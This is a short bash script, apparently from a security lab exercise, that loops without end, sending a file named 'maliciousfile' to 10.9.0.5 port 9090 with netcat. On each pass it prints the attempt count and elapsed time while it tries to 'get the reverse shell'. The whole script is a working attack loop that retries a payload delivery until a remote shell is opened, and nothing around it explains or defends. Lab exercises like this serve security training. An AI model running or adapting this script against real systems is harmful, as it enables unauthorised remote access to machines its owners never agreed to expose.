#!/bin/bash

SECONDS=0
Var_v=0

while true; do
  Var_v=$(( $Var_v + 1 ))
  duration=$SECONDS
  min=$(($duration / 60))
  sec=$(($duration % 60))
  echo "$min mins and $sec secs elapsed for getting the reverse shell."
  echo "The malicious payload has been in process to get the reverse shell $Var_v times so far."
  cat maliciousfile | nc 10.9.0.5 9090
done
